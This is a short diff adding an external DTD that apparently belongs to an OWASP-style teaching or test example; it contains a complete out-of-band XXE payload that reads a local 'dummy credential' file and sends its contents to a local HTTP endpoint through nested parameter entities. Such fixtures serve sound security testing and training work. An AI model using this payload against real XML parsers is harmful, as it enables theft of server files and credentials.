@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///opt/dummy-credential-xxe.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://127.0.0.1:8080/doku-owasp-example/xxe/upload-data-from-evil-external-dtd?content=%file;'>">
+%eval;
+%error;
